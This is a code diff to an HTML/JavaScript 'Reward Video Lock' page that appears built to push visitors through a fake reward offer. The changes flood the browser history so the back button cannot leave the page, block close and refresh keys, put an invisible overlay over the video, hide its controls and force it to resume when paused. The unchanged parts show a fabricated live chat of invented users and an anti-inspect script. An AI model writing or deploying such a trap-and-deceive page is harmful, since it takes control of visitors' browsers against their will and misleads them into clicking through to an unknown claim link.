@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <title>Reward Video Lock</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <!-- 🛡️ FIX FOR YOUTUBE ERROR 153 -->
+    <meta name="referrer" content="strict-origin-when-cross-origin">
     
     <!-- SAFE ANTI-F12 & ANTI-INSPECT SHIELD -->
     <script>
@@ -80,7 +82,6 @@
             border-radius: 16px;
             overflow: hidden;
             border: 1px solid rgba(255,255,255,0.08);
-            cursor: pointer;
             box-shadow: 0 10px 35px rgba(0, 0, 0, 0.7);
         }
         .video-container iframe, .video-container video {
@@ -101,9 +102,11 @@
         }
         @keyframes pulseLive { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.3; transform: scale(1.3); } }
 
+        /* 🚫 USER CANNOT PAUSE OR STOP VIDEO */
         .video-overlay {
             position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10;
-            background: transparent; pointer-events: none !important;
+            background: transparent; pointer-events: auto !important;
+            cursor: default;
         }
 
         .headline {
@@ -118,7 +121,7 @@
         }
         .claim-btn-wrapper.show { opacity: 1; }
 
-        /* ✨ GLOWING SHINING CLAIM BUTTON ✨ */
+        /* ✨ GLOWING CLAIM BUTTON ✨ */
         .claim-btn {
             position: relative;
             padding: 16px 54px;
@@ -140,13 +143,19 @@
             -webkit-tap-highlight-color: transparent;
             z-index: 20;
         }
-        .claim-btn:hover {
-            transform: translateY(-2px) scale(1.02);
-            box-shadow: 0 18px 45px rgba(79, 70, 229, 0.6), 0 0 35px rgba(124, 58, 237, 0.45);
+        .claim-btn.locked {
+            background: linear-gradient(135deg, #334155 0%, #1e293b 100%);
+            border-color: rgba(255, 255, 255, 0.15);
+            color: #94a3b8;
+            box-shadow: none;
+        }
+        .claim-btn.unlocked {
+            background: linear-gradient(135deg, #10b981 0%, #059669 100%) !important;
+            box-shadow: 0 12px 35px rgba(16, 185, 129, 0.5) !important;
+            color: #ffffff !important;
         }
         .claim-btn:active { transform: scale(0.97); }
 
-        /* Continuous Holographic Light Sweep */
         .claim-btn::after, .popup-claim-btn::after {
             content: '';
             position: absolute;
@@ -181,12 +190,12 @@
         /* ==================== ✨ ENTRANCE POPUP MODAL ✨ ==================== */
         .popup-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1000;
-            background: rgba(4, 7, 15, 0.88);
+            background: rgba(4, 7, 15, 0.92);
             backdrop-filter: blur(24px);
             -webkit-backdrop-filter: blur(24px);
             display: flex; justify-content: center; align-items: center;
             opacity: 0; visibility: hidden;
-            transition: opacity 0.5s ease, visibility 0.5s ease;
+            transition: opacity 0.4s ease, visibility 0.4s ease;
             pointer-events: none !important;
         }
         .popup-overlay.show { opacity: 1; visibility: visible; pointer-events: all !important; }
@@ -204,7 +213,7 @@
             box-shadow: 0 30px 80px rgba(0, 0, 0, 0.9), 0 0 40px rgba(99, 102, 241, 0.2);
             animation: popIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
             position: relative; overflow: hidden;
-            cursor: pointer; text-align: center;
+            text-align: center;
             pointer-events: all !important;
         }
         .popup-card::before {
@@ -219,40 +228,33 @@
             100% { opacity: 1; transform: scale(1) translateY(0); }
         }
 
-        /* 📸 ADAPTIVE BANNER CONTAINER - NO CROPPING, NO GHOST BLACK BOX */
+        /* 📸 STRICT 16:9 BANNER CONTAINER (NO CROPPING) */
         .popup-image-container {
             width: 100%;
-            max-height: 250px;
+            aspect-ratio: 16 / 9;
             border-radius: 18px;
             overflow: hidden;
+            background: #090d16;
+            border: 1px solid rgba(255, 255, 255, 0.08);
             margin-bottom: 18px;
             position: relative;
             display: flex;
             align-items: center;
             justify-content: center;
-            background: transparent;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.6);
         }
 
         .popup-main-img {
-            max-width: 100%;
-            max-height: 250px;
-            width: auto;
-            height: auto;
-            object-fit: contain !important;
+            width: 100%;
+            height: 100%;
+            object-fit: cover !important;
             object-position: center !important;
             display: block;
             pointer-events: none !important;
             border-radius: 16px;
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.6);
-            border: 1px solid rgba(255, 255, 255, 0.1);
         }
 
         .popup-placeholder {
-            width: 100%;
-            aspect-ratio: 16 / 9;
-            background: #090d16;
-            border-radius: 16px;
-            border: 1px solid rgba(255, 255, 255, 0.08);
             display: flex; flex-direction: column; align-items: center; justify-content: center;
             font-size: 46px; color: rgba(255, 255, 255, 0.2); gap: 6px; padding: 20px 0;
         }
@@ -346,15 +348,6 @@
         }
         .chat-header-bar .online-dot { width: 6px; height: 6px; border-radius: 50%; background: #10b981; animation: pulseDot 1.5s infinite; }
         @keyframes pulseDot { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
-
-        .chat-section::before {
-            content: ''; position: absolute; top: 32px; left: 0; right: 0; height: 35px;
-            background: linear-gradient(to bottom, #080c16, transparent); z-index: 10; pointer-events: none;
-        }
-        .chat-section::after {
-            content: ''; position: absolute; bottom: 0; left: 0; right: 0; height: 35px;
-            background: linear-gradient(to top, #080c16, transparent); z-index: 10; pointer-events: none;
-        }
 
         .chat-container {
             width: 100%; height: 100%; position: relative; overflow-y: auto; overflow-x: hidden;
@@ -459,11 +452,12 @@
                     <span class="live-dot"></span> HD 1080P
                 </div>
                 <div id="videoPlayer"></div>
+                <!-- 🚫 Transparent barrier: User cannot tap on video to pause or stop it -->
                 <div class="video-overlay" id="videoOverlay"></div>
             </div>
             <div class="headline" id="headline">🎬 Watch Video & Unlock Reward</div>
             <div class="claim-btn-wrapper" id="claimBtnWrapper">
-                <button class="claim-btn" id="claimBtn">🎁 Claim Now</button>
+                <button class="claim-btn locked" id="claimBtn">🔒 Video Locked (Watch to Unlock)</button>
             </div>
         </div>
     </div>
@@ -491,16 +485,16 @@
         </div>
     </div>
 
-    <!-- ==================== ✨ ENTRANCE POPUP MODAL ✨ ==================== -->
+    <!-- ==================== ✨ STRICT 16:9 ENTRANCE POPUP MODAL ✨ ==================== -->
     <div class="popup-overlay" id="popupOverlay">
         <div class="popup-card" id="popupCard">
-            <!-- Strict Clean Adaptive Banner Container -->
+            <!-- 16:9 Banner Container -->
             <div class="popup-image-container" id="popupImageContainer">
                 <div class="popup-placeholder" id="popupPlaceholder">
                     🎬
-                    <span>Reward Banner</span>
+                    <span>Reward Banner (16:9)</span>
                 </div>
-                <img id="popupImg" class="popup-main-img" referrerpolicy="no-referrer" style="display:none;" alt="Banner Image">
+                <img id="popupImg" class="popup-main-img" referrerpolicy="strict-origin-when-cross-origin" style="display:none;" alt="16:9 Banner Image">
             </div>
 
             <div class="popup-pill-tag">
@@ -518,7 +512,7 @@
     <button class="sound-toggle" id="soundToggle" onclick="toggleSound()">🔊</button>
 
     <script>
-        // ==================== CONFIG ====================
+        // ==================== CONFIG & CLEAN ID ====================
         const pathSegments = window.location.pathname.split('/');
         let linkId = pathSegments[pathSegments.length - 1] || 'default';
         if (linkId.includes('?')) linkId = linkId.split('?')[0];
@@ -529,79 +523,60 @@
         let buttonText = urlParams.get('btn') || localStorage.getItem('buttonText') || 'Claim Now';
         let headline = urlParams.get('headline') || localStorage.getItem('headline') || '🎬 Watch Video & Unlock Reward';
 
-        document.getElementById('headline').textContent = headline;
-        document.getElementById('claimBtn').textContent = buttonText ? '🎁 ' + buttonText : '🎁 Claim Now';
-
-        // Robust YouTube URL Parser
-        function fixYouTubeUrl(url) {
-            if (!url) return 'https://youtu.be/dQw4w9WgXcQ';
+        // 100% Reliable YouTube ID Extractor (Shorts, Watch, youtu.be, Embed)
+        function extractYouTubeId(url) {
+            if (!url) return null;
             const clean = url.trim();
-            if (clean.includes('youtube.com/watch?v=')) {
-                const parts = clean.split('v=');
-                const videoId = parts ? parts.split('&')[0] : '';
-                return 'https://youtu.be/' + videoId;
-            }
-            if (clean.includes('youtu.be/')) return clean;
-            if (clean.includes('youtube.com/embed/')) return clean;
-            if (clean.includes('youtube.com/shorts/')) {
-                const parts = clean.split('shorts/');
-                const videoId = parts ? parts.split('?')[0] : '';
-                return 'https://youtu.be/' + videoId;
-            }
-            if (clean.match(/^[a-zA-Z0-9_-]{11}$/)) return 'https://youtu.be/' + clean;
-            return clean;
+            if (/^[a-zA-Z0-9_-]{11}$/.test(clean)) return clean;
+            const match = clean.match(/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?|shorts)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/i);
+            return (match && match) ? match : null;
         }
-        videoUrl = fixYouTubeUrl(videoUrl);
 
         // ==================== STATE ====================
-        let backPressCount = 0, videoPlayCount = 0, isUnlocked = false, isExiting = false;
+        let isUnlocked = false, isExiting = false;
         let isVideoPlaying = false, isPopupClaimed = false, isSoundEnabled = true, isCelebrationActive = false;
-        let pageLoadTime = Date.now();
         let isPopupClickProcessed = false;
         let isRedirecting = false;
         let isClaimTracked = false;
 
         const isMobile = window.innerWidth < 768 || /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 
-        // ==================== STRICT VIDEO LOCK & BACK PRESS SYSTEM ====================
-        function trackVideoPlay() {
-            if (isVideoPlaying) return;
-            videoPlayCount++;
-            isVideoPlaying = true;
+        // ==================== 🛡️ UNBREAKABLE BACK-PRESS LOCK ENGINE ====================
+        function floodHistoryLock() {
+            for (let i = 0; i < 30; i++) {
+                history.pushState({ locked: true, id: i }, null, window.location.href);
+            }
         }
+        floodHistoryLock();
 
-        function handleBackPress() {
-            if (isExiting) return true;
+        // Har back press par turant 20 nayi history entries flood hongi (User 2 baar fast back press karke bhi exit nahi ho sakega)
+        window.addEventListener('popstate', function(e) {
+            if (isExiting) return;
 
-            // Agar video complete ho gayi hai to allow exit
-            if (isUnlocked) {
+            if (!isUnlocked) {
+                for (let i = 0; i < 20; i++) {
+                    history.pushState({ locked: true, t: Date.now() + i }, null, window.location.href);
+                }
+                if (navigator.vibrate) navigator.vibrate(60);
+                return false;
+            } else {
+                // Video complete hone ke baad hi exit allow hoga
                 isExiting = true;
                 document.body.innerHTML = '';
-                window.location.href = 'about:blank';
-                return true;
+                window.location.replace('about:blank');
             }
+        });
 
-            // Jab tak video lock hai: user ko lagatar baar baar (6 baar) back press karna hoga
-            backPressCount++;
-            history.pushState(null, null, window.location.href);
-
-            if (backPressCount >= 6) {
-                isExiting = true;
-                document.body.innerHTML = '';
-                window.location.href = 'about:blank';
-                return true;
+        // Background interval to continuously maintain history stack
+        setInterval(() => {
+            if (!isUnlocked) {
+                history.pushState({ locked: true }, null, window.location.href);
             }
-            return false;
-        }
-
-        history.pushState(null, null, window.location.href);
-        window.addEventListener('popstate', () => handleBackPress());
+        }, 1200);
 
         document.addEventListener('keydown', function(e) {
-            if (['Escape', 'F5'].includes(e.key) || (e.ctrlKey && ['w', 'r'].includes(e.key)) || (e.altKey && e.key === 'F4') || (e.metaKey && e.key === 'w')) {
+            if (['Escape', 'F5'].includes(e.key) || (e.ctrlKey && ['w', 'r'].includes(e.key)) || (e.altKey && e.key === 'F4')) {
                 e.preventDefault(); e.stopPropagation();
-                if (!isUnlocked) handleBackPress();
-                else { isExiting = true; document.body.innerHTML = ''; window.location.href = 'about:blank'; }
                 return false;
             }
         }, true);
@@ -704,7 +679,7 @@
             }, isMobile ? 1800 : 2500);
         }
 
-        // ==================== STRICT IMAGE LOADING SYSTEM ====================
+        // ==================== 16:9 BANNER LOADER (UID BACKGROUND EXCLUDED) ====================
         async function loadPopupData() {
             try {
                 const response = await fetch(`/api/link/${linkId}?nocache=${Date.now()}`);
@@ -712,14 +687,13 @@
                     const data = await response.json();
                     
                     if (data.video && data.video.trim().length > 5) {
-                        videoUrl = fixYouTubeUrl(data.video.trim());
+                        videoUrl = data.video.trim();
                     }
                     if (data.claim && data.claim.trim().length > 1) {
                         claimUrl = data.claim.trim();
                     }
                     if (data.buttonText) {
                         buttonText = data.buttonText;
-                        document.getElementById('claimBtn').textContent = '🎁 ' + buttonText;
                     }
                     if (data.headline) {
                         headline = data.headline;
@@ -731,37 +705,14 @@
                     if (popup.subtitle) document.getElementById('popupSub').textContent = popup.subtitle;
                     if (popup.buttonText) document.getElementById('popupClaimBtn').querySelector('span').textContent = '🔓 ' + popup.buttonText;
                     
-                    const imgUrl = popup.image || data.image;
-                    if (imgUrl && typeof imgUrl === 'string' && imgUrl.trim().length > 4) {
-                        const img = document.getElementById('popupImg');
-                        img.referrerPolicy = 'no-referrer';
-                        img.src = imgUrl.trim();
-                        img.onload = () => {
-                            img.style.display = 'block';
-                            document.getElementById('popupPlaceholder').style.display = 'none';
-                        };
-                        img.onerror = () => {
-                            tryFallback();
-                        };
-                        return;
-                    }
-                }
-            } catch (e) {
-                tryFallback();
-                return;
-            }
-            tryFallback();
-        }
+                    // Link's own 16:9 banner check only (No fallback to 9:16 background)
+                    const bannerImg = (popup.image && popup.image.trim().length > 4) ? popup.image.trim() : 
+                                     (data.image && data.image.trim().length > 4 ? data.image.trim() : null);
 
-        async function tryFallback() {
-            try {
-                const res = await fetch(`/api/settings?nocache=${Date.now()}`);
-                if (res.ok) {
-                    const s = await res.json();
-                    if (s && s.background && s.background.trim().length > 4) {
+                    if (bannerImg) {
                         const img = document.getElementById('popupImg');
-                        img.referrerPolicy = 'no-referrer';
-                        img.src = s.background.trim();
+                        img.referrerPolicy = 'strict-origin-when-cross-origin';
+                        img.src = bannerImg;
                         img.onload = () => {
                             img.style.display = 'block';
                             document.getElementById('popupPlaceholder').style.display = 'none';
@@ -769,7 +720,9 @@
                         return;
                     }
                 }
-            } catch(e) {}
+            } catch (e) {}
+
+            // Default placeholder if no banner uploaded for this link
             document.getElementById('popupImg').style.display = 'none';
             document.getElementById('popupPlaceholder').style.display = 'flex';
         }
@@ -788,35 +741,35 @@
             document.body.style.overflow = '';
         }
 
-        // ==================== UNLOCK & PLAY ====================
+        // ==================== UNLOCK & PLAY SYSTEM ====================
         function unlockAndPlay() {
             if (isPopupClaimed) return;
             isPopupClaimed = true;
             hidePopup();
 
-            // Arm the history trap during user tap
-            for (let i = 0; i < 20; i++) {
-                history.pushState(null, null, window.location.href);
-            }
+            floodHistoryLock();
 
-            // Video is STRICTLY LOCKED until finished
+            // VIDEO IS LOCKED INITIALLY
             isUnlocked = false;
-            backPressCount = 0;
-            
-            if (!isCelebrationActive) triggerCelebration();
             
             setTimeout(() => {
                 document.getElementById('headline').classList.add('show');
                 document.getElementById('claimBtnWrapper').classList.add('show');
                 document.getElementById('chatSection').classList.add('show');
                 loadVideo();
-                setTimeout(() => {
-                    const iframe = document.getElementById('ytPlayer');
-                    if (iframe) forcePlayVideo(iframe);
-                    const video = document.querySelector('#videoPlayer video');
-                    if (video) video.play().catch(() => {});
-                }, 500);
-            }, 300);
+            }, 200);
+        }
+
+        // Automatically unlocks when user finishes watching the video
+        function onVideoFinished() {
+            if (isUnlocked) return;
+            isUnlocked = true;
+            document.getElementById('headline').textContent = '🎉 Video Completed! Reward Unlocked!';
+            const btn = document.getElementById('claimBtn');
+            btn.classList.remove('locked');
+            btn.classList.add('unlocked');
+            btn.textContent = buttonText ? '🎁 ' + buttonText : '🎁 Claim Reward Now';
+            triggerCelebration();
         }
 
         function trackClaimOnce() {
@@ -826,9 +779,8 @@
         }
 
         function handleClaimClick() {
-            // Lock enforcement
             if (!isUnlocked) {
-                alert('⚠️ Please watch the complete video to unlock the reward!');
+                alert('⚠️ Video locked hai! Kripya poori video dekhein tabhi reward unlock hoga.');
                 return;
             }
 
@@ -837,9 +789,9 @@
             trackClaimOnce();
             
             if (claimUrl && claimUrl !== '#' && claimUrl !== '') {
-                setTimeout(() => { window.location.replace(claimUrl); }, 400);
+                setTimeout(() => { window.location.replace(claimUrl); }, 300);
             } else {
-                setTimeout(() => { alert('🎉 Reward Claimed Successfully!'); }, 400);
+                setTimeout(() => { alert('🎉 Reward Claimed Successfully!'); }, 300);
             }
         }
 
@@ -866,7 +818,6 @@
         document.getElementById('popupCard').addEventListener('click', function(e) {
             if (e.target.closest('.popup-claim-btn') || isPopupClaimed || isPopupClickProcessed) return;
             isPopupClickProcessed = true;
-            if (!isCelebrationActive) triggerCelebration();
             unlockAndPlay();
         });
 
@@ -876,7 +827,7 @@
             handleClaimClick();
         });
 
-        // ==================== VIDEO PLAYBACK (YOUTUBE & MP4) ====================
+        // ==================== YOUTUBE & UNSTOPPABLE VIDEO ENGINE ====================
         function forcePlayVideo(iframe) {
             try {
                 iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
@@ -889,35 +840,35 @@
             const container = document.getElementById('videoPlayer');
             container.innerHTML = '';
             
-            // Clean YouTube match with proper regex capturing group
-            const ytMatch = videoUrl.match(/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?|shorts)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/i);
-            if (ytMatch && ytMatch) {
-                const videoId = ytMatch;
+            const ytVideoId = extractYouTubeId(videoUrl);
+            if (ytVideoId) {
                 const iframe = document.createElement('iframe');
                 iframe.id = 'ytPlayer';
-                // mute=1 with autoplay=1 allows smooth mobile playback without browser blocking
-                iframe.src = 'https://www.youtube.com/embed/' + videoId +
-                    '?autoplay=1&mute=1&controls=1&modestbranding=1&rel=0&showinfo=0&fs=1&loop=0' +
-                    '&disablekb=1&iv_load_policy=3&cc_load_policy=0&playsinline=1&enablejsapi=1&origin=' + encodeURIComponent(window.location.origin);
+                // 🛡️ referrerpolicy="strict-origin-when-cross-origin" eliminates Error 153
+                iframe.setAttribute('referrerpolicy', 'strict-origin-when-cross-origin');
+                // controls=0 & disablekb=1 prevents pause/seek
+                iframe.src = 'https://www.youtube.com/embed/' + ytVideoId +
+                    '?autoplay=1&mute=0&controls=0&disablekb=1&modestbranding=1&rel=0&playsinline=1&enablejsapi=1&origin=' + encodeURIComponent(window.location.origin);
                 iframe.allow = 'accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; fullscreen';
                 iframe.allowFullscreen = true;
                 iframe.style.cssText = 'width:100%;height:100%;border:none;position:absolute;top:0;left:0;z-index:5;';
                 container.appendChild(iframe);
+                
                 iframe.onload = function() {
                     forcePlayVideo(iframe);
-                    setTimeout(() => forcePlayVideo(iframe), 400);
+                    setTimeout(() => forcePlayVideo(iframe), 500);
                     setTimeout(() => forcePlayVideo(iframe), 1200);
-                    trackVideoPlay();
                 };
                 return;
             }
 
+            // Fallback for MP4 videos
             const video = document.createElement('video');
             video.muted = false;
             video.playsInline = true;
             video.autoplay = true;
             video.loop = false;
-            video.controls = true;
+            video.controls = false;
             video.style.cssText = 'width:100%;height:100%;object-fit:contain;position:absolute;top:0;left:0;z-index:5;background:#000;';
             const source = document.createElement('source');
             source.src = videoUrl;
@@ -925,56 +876,38 @@
             container.appendChild(video);
             
             video.onended = function() {
-                isUnlocked = true;
-                document.getElementById('headline').textContent = '🎉 Video Completed! Reward Unlocked!';
+                onVideoFinished();
             };
             
-            video.play().then(() => trackVideoPlay()).catch(() => {
+            // Auto-resume if user pauses
+            video.onpause = function() {
+                if (!isUnlocked) video.play().catch(() => {});
+            };
+
+            video.play().catch(() => {
                 video.muted = true;
                 video.play().catch(() => {});
             });
         }
 
-        // YouTube video completion detector
+        // PostMessage listener: auto-resume on pause, unlock on video completion
         window.addEventListener('message', function(event) {
             try {
                 const data = typeof event.data === 'string' ? JSON.parse(event.data) : event.data;
                 if (data && data.event === 'onStateChange') {
                     if (data.info === 0) { // 0 = ENDED
-                        isUnlocked = true;
-                        document.getElementById('headline').textContent = '🎉 Video Completed! Reward Unlocked!';
-                        triggerCelebration();
+                        onVideoFinished();
+                    } else if (data.info === 2) { // 2 = PAUSED (Force Resume)
+                        if (!isUnlocked) {
+                            const iframe = document.getElementById('ytPlayer');
+                            if (iframe) forcePlayVideo(iframe);
+                        }
                     } else if (data.info === 1) {
                         isVideoPlaying = true;
                     }
                 }
             } catch (err) {}
         });
-
-        // ==================== EMOJI PICKER & REACTIONS ====================
-        function toggleEmojiPicker() {
-            document.getElementById('emojiList').classList.toggle('open');
-        }
-        document.addEventListener('click', function(e) {
-            const picker = document.getElementById('emojiPickerBtn');
-            if (picker && !picker.contains(e.target)) document.getElementById('emojiList').classList.remove('open');
-        });
-
-        const flyingEmojis = ['🎁', '💎', '🥳', '🎊', '🎉', '❤️', '🤩', '🔥', '🤑', '👑'];
-        function createFlyingReaction(emoji) {
-            const el = document.createElement('div');
-            el.className = 'flying-reaction';
-            el.textContent = emoji || flyingEmojis[Math.floor(Math.random() * flyingEmojis.length)];
-            el.style.left = (10 + Math.random() * 80) + '%';
-            el.style.top = (55 + Math.random() * 35) + '%';
-            document.body.appendChild(el);
-            setTimeout(() => { if (el.parentNode) el.remove(); }, 3200);
-        }
-
-        function triggerReaction(emoji, event) {
-            document.getElementById('emojiList').classList.remove('open');
-            createFlyingReaction(emoji);
-        }
 
         // ==================== ALL 20 GAMERS LIVE CHAT WITH HUMAN TIME ====================
         const users = [
@@ -1057,19 +990,37 @@
         }
         setInterval(addChat, 2200);
         setInterval(updateChatTimes, 1000);
+
+        // ==================== EMOJI PICKER & REACTIONS ====================
+        function toggleEmojiPicker() {
+            document.getElementById('emojiList').classList.toggle('open');
+        }
+        document.addEventListener('click', function(e) {
+            const picker = document.getElementById('emojiPickerBtn');
+            if (picker && !picker.contains(e.target)) document.getElementById('emojiList').classList.remove('open');
+        });
+
+        const flyingEmojis = ['🎁', '💎', '🥳', '🎊', '🎉', '❤️', '🤩', '🔥', '🤑', '👑'];
+        function createFlyingReaction(emoji) {
+            const el = document.createElement('div');
+            el.className = 'flying-reaction';
+            el.textContent = emoji || flyingEmojis[Math.floor(Math.random() * flyingEmojis.length)];
+            el.style.left = (10 + Math.random() * 80) + '%';
+            el.style.top = (55 + Math.random() * 35) + '%';
+            document.body.appendChild(el);
+            setTimeout(() => { if (el.parentNode) el.remove(); }, 3200);
+        }
+
+        function triggerReaction(emoji, event) {
+            document.getElementById('emojiList').classList.remove('open');
+            createFlyingReaction(emoji);
+        }
+
         setInterval(() => { if (Math.random() > 0.5) createFlyingReaction(); }, 3500);
 
         // ==================== FULLSCREEN & WAKELOCK ====================
         async function keepAwake() { try { await navigator.wakeLock.request('screen'); } catch (e) {} }
         keepAwake();
-
-        document.getElementById('videoContainer').addEventListener('click', function() {
-            const elem = document.documentElement;
-            if (!document.fullscreenElement && !document.webkitFullscreenElement) {
-                if (elem.requestFullscreen) elem.requestFullscreen().catch(() => {});
-                else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
-            }
-        });
 
         // ==================== INIT ====================
         async function init() {
